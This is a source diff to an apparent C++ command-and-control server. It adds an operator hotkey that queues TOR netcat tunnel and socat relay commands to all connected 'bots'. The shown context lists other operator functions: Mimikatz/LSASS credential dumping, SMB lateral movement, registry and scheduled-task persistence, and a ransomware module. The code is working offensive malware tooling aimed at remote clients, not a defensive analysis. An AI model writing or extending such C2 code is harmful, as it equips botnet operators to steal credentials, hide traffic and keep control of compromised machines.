@@ -3296,6 +3296,24 @@ std::atomic<bool> serverRunning(true);
                 std::cout << "\033[32m[+] 3 network commands queued for " << targetCount << " active client(s)\033[0m\n";
                 Sleep(200);
             }
+            else if (GetAsyncKeyState('O') & 0x8000) {
+                std::cout << "\n\033[33m[!] MANUAL COMMAND TRIGGERED: O - TOR Netcat/Socat\033[0m\n";
+                std::cout << "\033[31m[WARNING] This will create REAL network processes and connections!\033[0m\n";
+                logActivity("*** MANUAL ***", "O_PRESSED", "TOR netcat/socat initiated by operator");
+                logActivity("C2", "COMMAND", "Creating TOR netcat/socat connections on all bots");
+
+                int targetCount = 0;
+                for (const auto& [id, client] : connectedClients) {
+                    if (client.isActive) {
+                        clientCommandQueue[id].push_back(CMD_NETCAT_TUNNEL);
+                        clientCommandQueue[id].push_back(CMD_SOCAT_RELAY);
+                        targetCount++;
+                    }
+                }
+
+                std::cout << "\033[32m[+] 2 network commands queued for " << targetCount << " active client(s)\033[0m\n";
+                Sleep(200);
+            }
             else if (GetAsyncKeyState('M') & 0x8000) {
                 logActivity("C2", "COMMAND", "Executing Mimikatz on all bots");
                 for (const auto& [id, client] : connectedClients) {
@@ -3370,6 +3388,7 @@ std::atomic<bool> serverRunning(true);
                 std::cout << "|   L - Lateral Movement (Port Scan + SMB)                                  |\n";
                 std::cout << "|   M - Mimikatz/LSASS Memory Dump                                          |\n";
                 std::cout << "|   N - Network Tunnels (SSH/Netcat/Socat) [REAL PROCESSES]                |\n";
+                std::cout << "|   O - TOR Netcat/Socat Connections [REAL PROCESSES]                      |\n";
                 std::cout << "|   P - Install Persistence (Registry/Scheduled Task)                       |\n";
                 std::cout << "|   R - Deploy Ransomware Simulation                                        |\n";
                 std::cout << "|   S - Take Screenshot                                                     |\n";
